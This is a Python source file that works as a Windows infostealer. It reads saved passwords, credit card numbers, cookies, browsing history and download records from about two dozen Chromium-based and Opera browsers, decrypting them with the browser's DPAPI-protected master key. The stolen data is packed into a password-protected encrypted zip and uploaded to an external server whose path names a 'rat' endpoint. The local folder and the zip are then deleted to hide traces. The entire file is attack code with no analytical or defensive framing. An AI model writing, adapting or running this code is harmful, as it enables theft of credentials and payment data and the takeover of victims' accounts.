import base64
import json
import os
import shutil
import sqlite3
import requests  # Added to handle the file upload
import pyzipper  # Added to encrypt the zip
from datetime import datetime, timedelta

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')  # Roaming folder

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass

def save_results(browser_name, type_of_data, content):
    main_folder = 'windows_data_36'
    if not os.path.exists(main_folder):
        os.mkdir(main_folder)

    browser_folder = os.path.join(main_folder, browser_name)
    if not os.path.exists(browser_folder):
        os.mkdir(browser_folder)

    if content:
        with open(f'{browser_folder}/{type_of_data}.txt', 'w', encoding="utf-8") as f:
            f.write(content)
        print(f"\t [*] Saved in {browser_folder}/{type_of_data}.txt")
    else:
        print(f"\t [-] No Data Found!")

def create_encrypted_zip_and_delete_folder(folder_name, password):
    zip_path = os.path.join(roaming, folder_name + '.zip')  # Save zip to Roaming folder
    
    with pyzipper.AESZipFile(zip_path, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(password.encode('utf-8'))
        for root, dirs, files in os.walk(folder_name):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_name)  # Store relative paths
                zf.write(file_path, arcname=arcname)
    
    print(f"\t [*] Created encrypted zip: {zip_path}")
    
    shutil.rmtree(folder_name)
    print(f"\t [*] Deleted folder: {folder_name}")
    
    return zip_path  # Return the path to the encrypted zip file

def upload_to_server(zip_file_path, server_url):
    with open(zip_file_path, 'rb') as f:
        files = {'zip_file': f}
        response = requests.post(server_url, files=files)
        print(f"Server response: {response.text}")
    
    # Delete zip file after upload
    if os.path.exists(zip_file_path):
        os.remove(zip_file_path)
        print(f"\t [*] Deleted zip file from: {zip_file_path}")

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return ""
    
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
    except Exception as e:
        print(f"Can't access file {type_of_data['file']}: {str(e)}")
        return result

    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes) and row[i]:
                    row[i] = decrypt_password(row[i], key)
        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x] + "\\Local State"):
            available.append(x)
    return available

if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting Stored Details from {browser}")

        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            profile = "Default" if browser not in ['opera-gx'] else ""
            data = get_data(browser_path, profile, master_key, data_type)
            save_results(browser, data_type_name, data)
            print("\t------\n")

    # Create encrypted zip in Roaming folder and delete original folder
    password = 'server884063'
    zip_path = create_encrypted_zip_and_delete_folder('windows_data_36', password)
    
    # Upload zip to server and delete the local copy
    server_url = "https://dkydivyansh.com/Project/api/rat/"
    upload_to_server(zip_path, server_url)
